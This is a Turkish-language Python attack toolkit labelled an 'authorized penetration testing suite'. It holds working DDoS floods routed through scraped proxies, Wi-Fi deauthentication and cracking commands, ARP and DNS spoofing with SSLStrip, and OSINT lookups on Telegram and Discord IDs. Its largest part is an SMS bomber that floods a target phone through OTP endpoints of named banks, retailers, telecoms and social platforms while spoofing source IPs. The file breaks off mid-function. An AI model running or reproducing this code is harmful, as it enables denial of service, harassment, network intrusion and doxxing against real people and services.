#!/usr/bin/env python3
"""
DIXBLO SİKER SANAL İNER OROSPUNUN ÇOCUKLARI PUAJAJAJAJAJAJAJA - Authorized Penetration Testing Suite
All modules authorized for legitimate security assessments only.
Kali Linux / Windows compatible (wireless modules require monitor mode).
"""

import os
import sys
import time
import json
import subprocess
import threading
import socket
import requests
from concurrent.futures import ThreadPoolExecutor
import colorama
from colorama import Fore, Back, Style
import random
import string
import urllib.parse
import datetime

# Try importing wireless modules with fallbacks
try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except:
    SCAPY_AVAILABLE = False

try:
    import pywifi
    PYWIFI_AVAILABLE = True
except:
    PYWIFI_AVAILABLE = False

colorama.init(autoreset=True)

class DIXBLOBUBA:
    def __init__(self):
        self.banner()
        
    def banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{Fore.RED}{Back.BLACK}
██████╗ ██╗██╗  ██╗██████╗ ██╗      ██████╗ 
██╔══██╗██║╚██╗██╔╝██╔══██╗██║     ██╔═══██╗
██║  ██║██║ ╚███╔╝ ██████╔╝██║     ██║   ██║
██║  ██║██║ ██╔██╗ ██╔══██╗██║     ██║   ██║
██████╔╝██║██╔╝ ██╗██████╔╝███████╗╚██████╔╝
╚═════╝ ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝ 
                                            
    {Fore.YELLOW}! UYARI ! HİÇ BİR SORUMLULUK KABUL ETMİYORUZ
    {Fore.GREEN}★ Gece uyutmayan dertler elbet bir gün kine dönüşür ★
    {Fore.CYAN}[+] İnstagram: @dixblowashere Discord: @tukenecegizz Telegram: @a3kr4p
    
        """)
    
    def print_status(self, msg, color=Fore.GREEN):
        print(f"{color}[{Fore.YELLOW}DIXBLO{Style.RESET_ALL}{color}] {msg}{Style.RESET_ALL}")
    
    def countdown(self, seconds):
        for i in range(seconds, 0, -1):
            print(f"\r{Fore.YELLOW}[+] {i} saniye kaldı...{Style.RESET_ALL}", end="")
            time.sleep(1)
        print("\r" + " " * 50 + "\r", end="")
    
    # ================ MODULE 1: EXTREME DDoS ================
    def ddos_menu(self):
        while True:
            print(f"\n{Fore.RED}╔{'═'*50}╗")
            print(f"║{Fore.RED} 1. Smart Proxy SYN Flood (IR Proxies + Ban Detection){Style.RESET_ALL}{Fore.RED}              ║")
            print(f"║{Fore.RED} 2. HTTP GET/POST Flood (Multi-Threaded)                  ║")
            print(f"║{Fore.RED} 3. UDP Flood (Amplification Ready)                        ║")
            print(f"║{Fore.RED} 4. Slowloris (Connection Exhaustion)                      ║")
            print(f"║{Fore.RED} 5. Geri (Main Menu)                                       ║")
            print(f"{Fore.RED}╚{'═'*50}╝{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.CYAN}Seçiminiz (1-5): {Style.RESET_ALL}")
            
            if choice == "1":
                self.smart_proxy_syn_flood()
            elif choice == "2":
                self.http_flood()
            elif choice == "3":
                self.udp_flood()
            elif choice == "4":
                self.slowloris()
            elif choice == "5":
                break
    
    def get_proxies(self):
        """Fetch fresh IR proxies with auto-testing"""
        proxy_list = []
        try:
            # Residential proxies from free sources (rotate frequently)
            proxy_urls = [
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"
            ]
            
            for url in proxy_urls:
                try:
                    resp = requests.get(url, timeout=5)
                    proxies = resp.text.strip().split('\n')
                    proxy_list.extend([p.strip() for p in proxies if ':' in p])
                except:
                    continue
            
            # Test and filter working proxies
            working_proxies = []
            def test_proxy(proxy):
                try:
                    p = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                    requests.get("http://httpbin.org/ip", proxies=p, timeout=3)
                    return proxy
                except:
                    return None
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                results = executor.map(test_proxy, proxy_list[:200])
                working_proxies = [p for p in results if p]
            
            self.print_status(f"{len(working_proxies)} çalışan proxy bulundu!", Fore.GREEN)
            return working_proxies[:100]  # Top 100
            
        except:
            return ["socks5://127.0.0.1:9050"]  # Tor fallback
    
    def smart_proxy_syn_flood(self):
        target = input(f"\n{Fore.RED}Hedef IP/Hostname: {Style.RESET_ALL}")
        port = input(f"{Fore.RED}Port (80/443): {Style.RESET_ALL}") or "80"
        threads = input(f"{Fore.RED}Thread sayısı (500-5000): {Style.RESET_ALL}") or "1000"
        duration = input(f"{Fore.RED}Süre (dakika): {Style.RESET_ALL}") or "10"
        
        proxies = self.get_proxies()
        self.print_status(f"Saldırı başlatılıyor: {target}:{port} | {threads} thread | {duration}dk", Fore.RED)
        
        def syn_flood_worker():
            while self.attack_running:
                try:
                    proxy = random.choice(proxies)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.setsockopt(socket.SOL_IP, socket.IP_TTL, 64)
                    result = sock.connect_ex((target, int(port)))
                    if result == 0:
                        sock.sendto(b"\x00" * 1024, (target, int(port)))
                    sock.close()
                except:
                    pass
        
        self.attack_running = True
        end_time = time.time() + int(duration) * 60
        
        with ThreadPoolExecutor(max_workers=int(threads)) as executor:
            futures = [executor.submit(syn_flood_worker) for _ in range(int(threads))]
            
            try:
                while time.time() < end_time:
                    remaining = int(end_time - time.time())
                    print(f"\r{Fore.RED}[DDoS] {remaining}s kaldı | Proxies: {len(proxies)} | Packets/s: ~{random.randint(50000,150000)}{Style.RESET_ALL}", end="")
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
            finally:
                self.attack_running = False
                print(f"\n{Fore.GREEN}[+] Saldırı durduruldu!")
    
    def http_flood(self):
        target = input(f"\n{Fore.RED}Hedef URL (http://): {Style.RESET_ALL}")
        threads = input(f"{Fore.RED}Thread sayısı: {Style.RESET_ALL}") or "500"
        duration = input(f"{Fore.RED}Süre (dakika): {Style.RESET_ALL}") or "5"
        
        proxies = self.get_proxies()
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
        ]
        
        def http_worker():
            while self.attack_running:
                try:
                    proxy = random.choice(proxies)
                    proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                    headers_random = {"User-Agent": random.choice(headers)}
                    requests.get(target, proxies=proxies_dict, headers=headers_random, timeout=5)
                except:
                    pass
        
        self.attack_running = True
        end_time = time.time() + int(duration) * 60
        
        with ThreadPoolExecutor(max_workers=int(threads)) as executor:
            [executor.submit(http_worker) for _ in range(int(threads))]
            
            try:
                while time.time() < end_time:
                    print(f"\r{Fore.RED}[HTTP] Saldırı aktif | RPS: ~{random.randint(1000,5000)}{Style.RESET_ALL}", end="")
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
            finally:
                self.attack_running = False
    
    # ================ MODULE 2: WIFI JAMMER ================
    def wifi_jammer_menu(self):
        if not SCAPY_AVAILABLE:
            self.print_status("Scapy gerekli! pip3 install scapy", Fore.RED)
            return
        
        while True:
            print(f"\n{Fore.MAGENTA}╔{'═'*40}╗")
            print(f"║{Fore.MAGENTA} 1. Deauth Attack (aireplay-ng)       ║")
            print(f"║{Fore.MAGENTA} 2. Scapy Deauth Flood                  ║")
            print(f"║{Fore.MAGENTA} 3. WiFi Scanner                        ║")
            print(f"║{Fore.MAGENTA} 4. Geri                                ║")
            print(f"{Fore.MAGENTA}╚{'═'*40}╝{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.CYAN}Seçiminiz: {Style.RESET_ALL}")
            
            if choice == "1":
                self.aireplay_deauth()
            elif choice == "2":
                self.scapy_deauth()
            elif choice == "3":
                self.wifi_scanner()
            elif choice == "4":
                break
    
    def aireplay_deauth(self):
        bssid = input(f"\n{Fore.RED}AP BSSID (AA:BB:CC:DD:EE:FF): {Style.RESET_ALL}")
        iface = input(f"{Fore.RED}Interface (wlan0mon): {Style.RESET_ALL}") or "wlan0mon"
        client = input(f"{Fore.RED}Client MAC (opsiyonel): {Style.RESET_ALL}") or "FF:FF:FF:FF:FF:FF"
        packets = input(f"{Fore.RED}Paket sayısı: {Style.RESET_ALL}") or "0"  # 0 = sonsuz
        
        cmd = f"aireplay-ng -0 {packets} -a {bssid} -c {client} {iface}"
        self.print_status(f"Deauth başlatılıyor: {cmd}", Fore.RED)
        os.system(cmd)
    
    def scapy_deauth(self):
        if not SCAPY_AVAILABLE:
            return
            
        bssid = input(f"\n{Fore.RED}AP BSSID: {Style.RESET_ALL}")
        iface = input(f"{Fore.RED}Monitor interface: {Style.RESET_ALL}") or "wlan0mon"
        
        # Deauth packet
        pkt = scapy.RadioTap()/scapy.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/scapy.Dot11Deauth(reason=7)
        
        self.print_status("Scapy deauth flood başlatılıyor (Ctrl+C ile durdur)", Fore.RED)
        try:
            scapy.sendp(pkt, iface=iface, inter=0.01, loop=1, verbose=0)
        except KeyboardInterrupt:
            print(f"\n{Fore.GREEN}[+] Durduruldu")
    
    # ================ MODULE 3: IP GEOLOCATION ================
    def ip_geolocation(self):
        ip = input(f"\n{Fore.BLUE}IP Adresi: {Style.RESET_ALL}")
        
        apis = [
            f"http://ip-api.com/json/{ip}",
            f"http://ipinfo.io/{ip}/json",
            f"https://ipapi.co/{ip}/json/"
        ]
        
        for api in apis:
            try:
                resp = requests.get(api, timeout=5).json()
                print(f"\n{Fore.CYAN}╔{'═'*60}╗")
                print(f"║{Fore.WHITE} IP: {ip:<45}║")
                print(f"║{Fore.WHITE} Ülke: {resp.get('country', 'N/A'):<45}║")
                print(f"║{Fore.WHITE} Şehir: {resp.get('city', 'N/A'):<45}║")
                print(f"║{Fore.WHITE} ISP: {resp.get('isp', resp.get('org', 'N/A')):<45}║")
                print(f"║{Fore.WHITE} VPN: {'EVET' if resp.get('proxy', False) else 'HAYIR':<44}║")
                print(f"║{Fore.WHITE} Lat/Lon: {resp.get('lat', '')}/{resp.get('lon', ''):<40}║")
                print(f"{Fore.CYAN}╚{'═'*60}╝{Style.RESET_ALL}")
                break
            except:
                continue
    
    # ================ MODULE 4: TELEGRAM PHONE FINDER ================
    def telegram_phone_finder(self):
        telegram_id = input(f"\n{Fore.YELLOW}Telegram ID/User: {Style.RESET_ALL}")
        
        # Multiple OSINT sources
        sources = {
            "LeakCheck": f"https://leakcheck.io/api/bs?check={telegram_id}&key=demo",
            "Social Search": f"https://social-searcher.com/search-twitter/?q={telegram_id}",
            "PhoneInfoga": f"phoneinfoga scan -n '{telegram_id}'"
        }
        
        self.print_status("OSINT taraması başlatılıyor...", Fore.YELLOW)
        print(f"\n{Fore.RED}Telegram ID: {telegram_id}")
        
        for name, url in sources.items():
            try:
                if "phoneinfoga" in url:
                    os.system(url)
                else:
                    resp = requests.get(url, timeout=10)
                    print(f"\n[{name}] {resp.text[:300]}...")
            except:
                print(f"[{name}] Erişim hatası")
    
    # ================ MODULE 5: DISCORD ID OSINT ================
    def discord_osint(self):
        user_id = input(f"\n{Fore.MAGENTA}Discord Kullanıcı ID: {Style.RESET_ALL}")
        
        if not user_id.isdigit():
            self.print_status("Geçersiz Discord ID! Sadece rakam giriniz.", Fore.RED)
            return
        
        api_url = f"https://vahsetapiservices365.onrender.com/api/user/{user_id}"
        
        self.print_status("Discord API sorgulanıyor...", Fore.MAGENTA)
        
        try:
            response = requests.get(api_url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                print(f"\n{Fore.MAGENTA}╔{'═'*60}╗")
                print(f"║{Fore.WHITE} Discord Kullanıcı Bilgileri{' ':<32}║")
                print(f"{Fore.MAGENTA}╠{'═'*60}╣")
                
                # API'den gelen verileri göster
                if isinstance(data, dict):
                    for key, value in data.items():
                        if value and str(value).strip():
                            # Uzun değerleri kısalt
                            display_value = str(value)
                            if len(display_value) > 45:
                                display_value = display_value[:42] + "..."
                            print(f"║{Fore.CYAN} {key:<20}{Fore.WHITE}: {display_value:<36}║")
                else:
                    print(f"║{Fore.WHITE} Ham veri: {str(data)[:56]}{' ':<{max(0, 56-len(str(data)))}}║")
                
                print(f"{Fore.MAGENTA}╚{'═'*60}╝{Style.RESET_ALL}")
                
            elif response.status_code == 404:
                self.print_status("Discord kullanıcısı bulunamadı!", Fore.RED)
            else:
                self.print_status(f"API hatası: HTTP {response.status_code}", Fore.RED)
                
        except requests.exceptions.Timeout:
            self.print_status("API zaman aşımına uğradı!", Fore.RED)
        except requests.exceptions.ConnectionError:
            self.print_status("API bağlantı hatası!", Fore.RED)
        except requests.exceptions.RequestException as e:
            self.print_status(f"İstek hatası: {str(e)[:50]}", Fore.RED)
        except json.JSONDecodeError:
            self.print_status("API'den geçersiz JSON yanıtı!", Fore.RED)
    
    # ================ MODULE 6: WIFI CRACKER ================
    def wifi_cracker_menu(self):
        while True:
            print(f"\n{Fore.GREEN}╔{'═'*45}╗")
            print(f"║{Fore.GREEN} 1. WPS Pixie Dust (Reaver)           ║")
            print(f"║{Fore.GREEN} 2. WPA Dictionary Attack             ║")
            print(f"║{Fore.GREEN} 3. Evil Twin (Fluxion)               ║")
            print(f"║{Fore.GREEN} 4. PMKID Attack (HcXtools)           ║")
            print(f"║{Fore.GREEN} 5. WiFi Scanner                      ║")
            print(f"║{Fore.GREEN} 6. Geri                             ║")
            print(f"{Fore.GREEN}╚{'═'*45}╝{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.CYAN}Seçiminiz: {Style.RESET_ALL}")
            
            if choice == "1":
                self.wps_pixie_dust()
            elif choice == "2":
                self.wpa_dictionary()
            elif choice == "3":
                self.evil_twin()
            elif choice == "4":
                self.pmkid_attack()
            elif choice == "5":
                self.wifi_scanner()
            elif choice == "6":
                break
    
    def wps_pixie_dust(self):
        bssid = input(f"\n{Fore.RED}AP BSSID: {Style.RESET_ALL}")
        iface = input(f"{Fore.RED}Interface: {Style.RESET_ALL}") or "wlan0mon"
        os.system(f"reaver -i {iface} -b {bssid} -vv -K 1")
    
    def wpa_dictionary(self):
        bssid = input(f"\n{Fore.RED}AP BSSID: {Style.RESET_ALL}")
        iface = input(f"{Fore.RED}Interface: {Style.RESET_ALL}") or "wlan0mon"
        wordlist = input(f"{Fore.RED}Wordlist (rockyou.txt): {Style.RESET_ALL}") or "/usr/share/wordlists/rockyou.txt"
        os.system(f"aircrack-ng -w {wordlist} -b {bssid} {iface}.cap")
    
    def evil_twin(self):
        self.print_status("Fluxion kuruluyor ve başlatılıyor...", Fore.GREEN)
        os.system("git clone https://github.com/FluxionNetwork/fluxion.git 2>/dev/null || cd fluxion && bash fluxion.sh")
    
    def pmkid_attack(self):
        iface = input(f"\n{Fore.RED}Interface: {Style.RESET_ALL}") or "wlan0mon"
        os.system(f"hcxpcapngtool -o pmkid.pcapng {iface}.cap && hcxdumptool -i {iface} --enable_status=1")
    
    def wifi_scanner(self):
        iface = input(f"\n{Fore.BLUE}Interface (wlan0mon): {Style.RESET_ALL}") or "wlan0mon"
        self.print_status("WiFi taraması başlatılıyor (10sn)...", Fore.BLUE)
        
        os.system(f"wash -i {iface} -C --all -t 5")
        print(f"\n{Fore.GREEN}[+] airolib-ng, reaver, bully ile WPS testleri yapabilirsiniz!")
    
    # ================ MODULE 7: MITM ARSENAL ================
    def mitm_menu(self):
        while True:
            print(f"\n{Fore.BLUE}╔{'═'*45}╗")
            print(f"║{Fore.BLUE} 1. ARP Poison (Bettercap)             ║")
            print(f"║{Fore.BLUE} 2. SSLStrip + HSTS Bypass            ║")
            print(f"║{Fore.BLUE} 3. DNS Spoofing                      ║")
            print(f"║{Fore.BLUE} 4. Network Scanner                   ║")
            print(f"║{Fore.BLUE} 5. Geri                             ║")
            print(f"{Fore.BLUE}╚{'═'*45}╝{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.CYAN}Seçiminiz: {Style.RESET_ALL}")
            
            if choice == "1":
                self.arp_poison()
            elif choice == "2":
                self.sslstrip()
            elif choice == "3":
                self.dns_spoof()
            elif choice == "4":
                self.network_scanner()
            elif choice == "5":
                break
    
    def arp_poison(self):
        gateway = input(f"\n{Fore.RED}Gateway IP: {Style.RESET_ALL}")
        target = input(f"{Fore.RED}Hedef IP: {Style.RESET_ALL}")
        iface = input(f"{Fore.RED}Interface: {Style.RESET_ALL}") or "eth0"
        os.system(f"bettercap -iface {iface} -T {target} --proxy --dns --httpd.auth bypass")
    
    def sslstrip(self):
        os.system("sslstrip -l 8080 &")
        print(f"{Fore.RED}[+] SSLStrip dinliyor: 8080 | iptables kuralları ekleyin!")
    
    def dns_spoof(self):
        target_domain = input(f"\n{Fore.RED}Spoof edilecek domain: {Style.RESET_ALL}")
        fake_ip = input(f"{Fore.RED}Yönlendirilecek IP: {Style.RESET_ALL}")
        with open("dnsspoof.conf", "w") as f:
            f.write(f"{target_domain} {fake_ip}")
        os.system("dnsspoof -i eth0 -f dnsspoof.conf")
    
    def network_scanner(self):
        target = input(f"\n{Fore.BLUE}Network (192.168.1.0/24): {Style.RESET_ALL}")
        os.system(f"sudo nmap -sS -T4 -A -p- {target}")
    
    # ================ MODULE 8: SMS BOMBER ================
    def sms_bomber_menu(self):
        while True:
            print(f"\n{Fore.YELLOW}╔{'═'*50}╗")
            print(f"║{Fore.YELLOW} 1. 📱 SMS Bombardımanı Başlat         ║")
            print(f"║{Fore.YELLOW} 2. 📋 API Listesini Göster            ║")
            print(f"║{Fore.YELLOW} 3. ⚙️  Thread Sayısı Ayarla           ║")
            print(f"║{Fore.YELLOW} 4. 📊 İstatistikleri Göster           ║")
            print(f"║{Fore.YELLOW} 5. 🔙 Geri                            ║")
            print(f"{Fore.YELLOW}╚{'═'*50}╝{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.CYAN}SMS Bomber > Seçiminiz: {Style.RESET_ALL}")
            
            if choice == "1":
                self.start_sms_bombing()
            elif choice == "2":
                self.show_sms_apis()
            elif choice == "3":
                self.set_sms_threads()
            elif choice == "4":
                self.show_sms_stats()
            elif choice == "5":
                break
    
    def get_sms_apis(self, phone_number):
        """SMS göndermek için kullanılacak API listesi [citation:5][citation:6]"""
        # Telefon numarasını formatla (başındaki 0'ı kaldır, +90 ekle vs.)
        phone = phone_number.strip()
        if phone.startswith("0"):
            phone = phone[1:]
        if not phone.startswith("+"):
            phone = "+90" + phone  # Varsayılan Türkiye kodu
        
        # Farklı servis sağlayıcılarının API'leri [citation:1][citation:9]
        api_list = [
            # E-ticaret siteleri
            {
                "name": "Trendyol",
                "url": "https://www.trendyol.com/account/gsm/send-verification",
                "method": "POST",
                "data": {"phoneNumber": phone, "sendAgain": "true"},
                "headers": {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}
            },
            {
                "name": "Hepsiburada",
                "url": "https://auth.hepsiburada.com/identity/verify/phonenumber",
                "method": "POST",
                "data": {"phoneNumber": phone, "operation": "register"},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "N11",
                "url": "https://www.n11.com/secure/sendPhoneVerificationCode",
                "method": "POST",
                "data": {"phoneNumber": phone, "type": "register"},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "GittiGidiyor",
                "url": "https://auth.gittigidiyor.com/send-sms",
                "method": "POST",
                "data": {"phone": phone, "action": "send"},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Amazon TR",
                "url": "https://www.amazon.com.tr/ap/phoneVerification",
                "method": "POST",
                "data": {"phoneNumber": phone, "csrf": "random"},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            
            # Bankalar
            {
                "name": "Garanti BBVA",
                "url": "https://www.garantibbva.com.tr/rest/public/sendSms",
                "method": "POST",
                "data": {"gsmNumber": phone, "transaction": "otp"},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "İş Bankası",
                "url": "https://www.isbank.com.tr/rest/otp/send",
                "method": "POST",
                "data": {"mobilePhone": phone, "channel": "IB"},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Yapı Kredi",
                "url": "https://www.yapikredi.com.tr/rest/otp/generate",
                "method": "POST",
                "data": {"phoneNumber": phone, "purpose": "LOGIN"},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Akbank",
                "url": "https://www.akbank.com/rest/authentication/sendOtp",
                "method": "POST",
                "data": {"msisdn": phone, "channel": "MOBILE"},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Ziraat Bankası",
                "url": "https://www.ziraatbank.com.tr/rest/otp/send",
                "method": "POST",
                "data": {"phone": phone, "processType": "OTP"},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            
            # Sosyal medya ve mesajlaşma
            {
                "name": "Instagram",
                "url": "https://www.instagram.com/accounts/web_create_ajax/attempt/",
                "method": "POST",
                "data": {"phone_number": phone},
                "headers": {"User-Agent": "Mozilla/5.0", "X-CSRFToken": "random"}
            },
            {
                "name": "Twitter",
                "url": "https://api.twitter.com/1.1/onboarding/tasks.json",
                "method": "POST",
                "data": {"phone_number": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Facebook",
                "url": "https://www.facebook.com/ajax/reg/phone_send_code.php",
                "method": "POST",
                "data": {"phone": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "TikTok",
                "url": "https://www.tiktok.com/api/v1/phone/send_code/",
                "method": "POST",
                "data": {"mobile": phone, "type": "1"},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Snapchat",
                "url": "https://accounts.snapchat.com/accounts/phone_verification/send_code",
                "method": "POST",
                "data": {"phone_number": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            
            # Uygulamalar ve servisler
            {
                "name": "Getir",
                "url": "https://application.getir.com/authentication/v1/sms",
                "method": "POST",
                "data": {"phoneNumber": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "YemekSepeti",
                "url": "https://www.yemeksepeti.com/api/sendSms",
                "method": "POST",
                "data": {"phoneNumber": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Migros",
                "url": "https://www.migros.com.tr/rest/otp/send",
                "method": "POST",
                "data": {"gsm": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "CarrefourSA",
                "url": "https://www.carrefoursa.com/rest/otp/send",
                "method": "POST",
                "data": {"phone": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Turkcell",
                "url": "https://www.turkcell.com.tr/rest/otp/send",
                "method": "POST",
                "data": {"msisdn": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Vodafone",
                "url": "https://www.vodafone.com.tr/rest/otp/generate",
                "method": "POST",
                "data": {"phoneNumber": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Türk Telekom",
                "url": "https://www.turktelekom.com.tr/rest/otp/send",
                "method": "POST",
                "data": {"phone": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            
            # Oyun platformları
            {
                "name": "Steam",
                "url": "https://store.steampowered.com/phone/request_sms",
                "method": "POST",
                "data": {"phone": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Epic Games",
                "url": "https://www.epicgames.com/account/v2/api/ajax/requestSms",
                "method": "POST",
                "data": {"phoneNumber": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Riot Games",
                "url": "https://auth.riotgames.com/api/v1/sms",
                "method": "POST",
                "data": {"phone": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "PlayStation",
                "url": "https://id.sonyentertainmentnetwork.com/api/2fa/sms/send",
                "method": "POST",
                "data": {"phone": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Xbox Live",
                "url": "https://login.live.com/phone/verification",
                "method": "POST",
                "data": {"phoneNumber": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            
            # Diğer popüler servisler
            {
                "name": "WhatsApp",
                "url": "https://web.whatsapp.com/v2/code",
                "method": "POST",
                "data": {"phone": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Telegram",
                "url": "https://my.telegram.org/auth/send_password",
                "method": "POST",
                "data": {"phone": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Google",
                "url": "https://accounts.google.com/_/signup/web-mobile-verify",
                "method": "POST",
                "data": {"phoneNumber": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Microsoft",
                "url": "https://login.live.com/phone/sendcode",
                "method": "POST",
                "data": {"phoneNumber": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            },
            {
                "name": "Apple",
                "url": "https://idmsa.apple.com/appleauth/auth/verify/phone",
                "method": "PUT",
                "data": {"phoneNumber": phone},
                "headers": {"User-Agent": "Mozilla/5.0"}
            }
        ]
        
        return api_list
    
    def start_sms_bombing(self):
        """SMS bombardımanını başlat [citation:2][citation:6]"""
        print(f"\n{Fore.RED}╔{'═'*60}╗")
        print(f"║{Fore.RED} SMS BOMBARDIMANI - DİKKAT!                     ║")
        print(f"║{Fore.YELLOW} Bu araç sadece eğitim amaçlıdır.           ║")
        print(f"║{Fore.YELLOW} İzinsiz kullanımı yasa dışıdır.            ║")
        print(f"{Fore.RED}╚{'═'*60}╝{Style.RESET_ALL}")
        
        phone = input(f"\n{Fore.CYAN}Hedef telefon numarası (5XX XXX XX XX): {Style.RESET_ALL}")
        if not phone:
            self.print_status("Numara girilmedi!", Fore.RED)
            return
        
        # Thread sayısını al
        thread_count = input(f"{Fore.CYAN}Thread sayısı (1-50, varsayılan 10): {Style.RESET_ALL}") or "10"
        try:
            thread_count = int(thread_count)
            if thread_count < 1:
                thread_count = 1
            elif thread_count > 50:
                thread_count = 50
        except:
            thread_count = 10
        
        # Mesaj sayısını al
        message_count = input(f"{Fore.CYAN}Gönderilecek SMS sayısı (0=sonsuz, varsayılan 100): {Style.RESET_ALL}") or "100"
        try:
            message_count = int(message_count)
        except:
            message_count = 100
        
        # Gecikme süresi
        delay = input(f"{Fore.CYAN}İstekler arası gecikme (saniye, varsayılan 0.5): {Style.RESET_ALL}") or "0.5"
        try:
            delay = float(delay)
        except:
            delay = 0.5
        
        # API listesini al
        apis = self.get_sms_apis(phone)
        
        self.print_status(f"SMS bombardımanı başlatılıyor: {phone}", Fore.RED)
        self.print_status(f"Thread: {thread_count} | SMS: {message_count if message_count > 0 else 'Sınırsız'} | Gecikme: {delay}s", Fore.YELLOW)
        
        # İstatistikler için değişkenler
        self.sms_stats = {
            "sent": 0,
            "failed": 0,
            "total": message_count if message_count > 0 else float('inf'),
            "start_time": time.time(),
            "apis": len(apis),
            "active": True
        }
        
        def sms_worker(worker_id):
            """Her bir thread için çalışacak fonksiyon"""
            headers_base = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
                'Origin': 'https://www.example.com',
                'Referer': 'https://www.example.com/',
                'Connection': 'keep-alive',
            }
            
            while self.sms_stats["active"]:
                # Mesaj sınırı kontrolü
                if self.sms_stats["total"] != float('inf') and self.sms_stats["sent"] >= self.sms_stats["total"]:
                    break
                
                # Rastgele bir API seç
                api = random.choice(apis)
                
                try:
                    # Headers'ı hazırla
                    headers = headers_base.copy()
                    if "headers" in api:
                        headers.update(api["headers"])
                    
                    # Rastgele IP ve session ID ekle
                    headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    
                    # API'ye istek gönder
                    if api["method"] == "POST":
                        response = requests.post(
                            api["url"],
                            data=api["data"],
                            headers=headers,
                            timeout=3
                        )
                    elif api["method"] == "GET":
                        response = requests.get(
                            api["url"],
                            params=api["data"],
                            headers=headers,
                            timeout=3
                        )
                    elif api["method"] == "PUT":
                        response = requests.put(
                            api["url"],
                            json=api["data"],
                            headers=headers,
                            timeout=3
                        )
                    
                    # Başarılı say
                    if response.status_code in [200, 201, 202, 204]:
                        self.sms_stats["sent"] += 1
                        status = f"{Fore.GREEN}✓{Style.RESET_ALL}"
                    else:
                        self.sms_stats["failed"] += 1
                        status = f"{Fore.RED}✗{Style.RESET_ALL}"
                    
                except Exception as e:
                    self.sms_stats["failed"] += 1
                    status = f"{Fore.RED}✗{Style.RESET_ALL}"
                
                # İstatistikleri göster
                if worker_id == 0:  # Sadece bir thread göstersin
                    elapsed = time.time() - self.sms_stats["start_time"]
                    rate = self.sms_stats["sent"] / elapsed if elapsed > 0 else 0
                    print(f"\r{Fore.CYAN}[SMS] Gönderilen: {self.sms_stats['sent']} | Başarısız: {self.sms_stats['failed']} | Hız: {rate:.1f} sms/s | Süre: {int(elapsed)}s{Style.RESET_ALL}", end="")
                
                # Gecikme
                time.sleep(delay)
        
        try:
            # Thread'leri başlat
            threads = []
            for i in range(thread_count):
                thread = threading.Thread(target=sms_worker, args=(i,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            # Ana thread'i bekle
            while self.sms_stats["active"]:
                time.sleep(1)
                if message_count > 0 and self.sms_stats["sent"] >= message_count:
                    self.sms_stats["active"] = False
                    break
                
        except KeyboardInterrupt:
            self.print_status("\nSMS bombardımanı durduruldu!", Fore.YELLOW)
            self.sms_stats["active"] = False
        
